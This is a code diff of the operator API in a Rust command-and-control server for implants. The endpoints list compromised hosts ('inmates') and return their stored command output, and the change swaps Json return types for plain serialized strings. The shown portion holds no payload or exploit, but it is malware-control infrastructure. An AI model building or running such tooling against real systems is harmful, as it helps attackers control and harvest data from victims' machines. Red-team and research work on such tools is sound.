@@ -99,27 +99,27 @@ fn get_c2_request(implant_id: u32) -> Json<CheckInResponse> {
 // Operator api
 
 #[get("/operator")]
-fn operator_panel() -> Json<String> {
+fn operator_panel() -> String {
     let all_inmates = get_all_inmates();
 
-    return Json(serde_json::to_string(&all_inmates).unwrap());
+    return serde_json::to_string(&all_inmates).unwrap();
 }
 
 #[get("/operator/<implant_id>")]
-fn operator_panel_specific(implant_id: u32) -> Json<String> {
+fn operator_panel_specific(implant_id: u32) -> String {
     let inmate = implant_exists(implant_id);
     match inmate {
         Ok(inmate) => {
-            return Json(serde_json::to_string(&inmate).unwrap());
+            return serde_json::to_string(&inmate).unwrap();
         }
         Err(_) => {
-            return Json("Does not exist".to_string());
+            return serde_json::to_string("Does not exist").unwrap();
         }
     }
 }
 
 #[get("/operator/<implant_id>/recent")]
-fn operator_panel_specific_recent(implant_id: u32) -> Result<Json<PostRequest>, Json<String>> {
+fn operator_panel_specific_recent(implant_id: u32) -> Result<String, String> {
     let inmate = implant_exists(implant_id);
     match inmate {
         Ok(inmate) => {
@@ -129,21 +129,23 @@ fn operator_panel_specific_recent(implant_id: u32) -> Result<Json<PostRequest>, 
                     let file_path = format!("artifacts/{}/{}/{}", implant_id, action.action_type.to_string(), action.timestamp);
                     match fs::read(&file_path) {
                         Ok(content) => {
-                            Ok(Json(PostRequest {
+                            let post_req: PostRequest = PostRequest {
                                 timestamp: action.timestamp,
                                 action_type: action.action_type,
                                 action_parameters: action.action_parameters.clone(),
                                 content,
-                            }))
+                            };
+                            println!("{:#?}", post_req);
+                            Ok(serde_json::to_string(&post_req).unwrap())
                         },
-                        Err(_) => Err(Json("Failed to read the file containing output, check permissions".to_string())),
+                        Err(_) => Err("Failed to read the file containing output, check permissions".to_string()),
                     }
                 }
-                None => Err(Json("No recent action found".to_string())),
+                None => Err("No recent action found".to_string()),
             }
         }
         Err(_) => {
-            Err(Json("Does not exist".to_string()))
+            Err("Does not exist".to_string())
         }
     }
 }
